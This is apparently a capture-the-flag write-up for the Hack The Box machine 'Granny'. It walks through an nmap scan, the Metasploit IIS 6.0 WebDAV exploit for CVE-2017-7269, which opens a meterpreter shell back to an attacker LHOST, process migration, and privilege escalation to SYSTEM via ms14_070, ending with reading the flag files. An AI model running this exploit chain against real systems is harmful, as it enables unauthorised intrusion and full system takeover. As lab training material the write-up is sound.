# Granny - Easy

```sh
sudo vim /etc/hosts
# map target IP to granny.htb

nmap -T4 -p- -A -Pn -v granny.htb
```

* open ports & services:

    * 80/tcp - http - Microsoft IIS httpd 6.0

* webpage on port 80 is 'Under Construction' and does not have a default page; this is using IIS server 6.0

* Googling for IIS server 6.0 exploits, we get CVE-2017-7269 - we can search for this exploit in ```metasploit``` as it is an older vuln:

    ```sh
    msfconsole -q

    search cve-2017-7269
    # it is available

    use exploit/windows/iis/iis_webdav_scstoragepathfromurl

    options

    set RHOSTS 10.129.252.130
    set LHOST 10.10.14.21

    run
    # this gives us meterpreter shell

    getuid
    # operation failed: access is denied
    # we can try migrating to another process

    ps
    
    migrate 3036
    # move to another process under 'nt authority\network service'

    getuid
    # now this works

    background
    # backgrounds session
    ```

* we can use recon modules in ```metasploit``` to check for privesc:

    ```sh
    use post/multi/recon/local_exploit_suggester

    options

    set SESSION 1

    run
    ```

* the 'local_exploit_suggester' module checks a few exploits and lists them - we can try any of them for privesc:

    ```sh
    use exploit/windows/local/ms14_070_tcpip_ioctl
    # the other exploits do not work all the time

    options

    set SESSION 1
    set LHOST 10.10.14.21
    set LPORT 4446

    run
    # this works
    # opens new meterpreter session

    getuid
    # nt authority\system

    search -f user.txt
    # search for user flag

    cat 'c:\Documents and Settings\Lakis\Desktop\user.txt'

    search -f root.txt
    # search for root flag

    cat 'c:\Documents and Settings\Administrator\Desktop\root.txt'
    ```
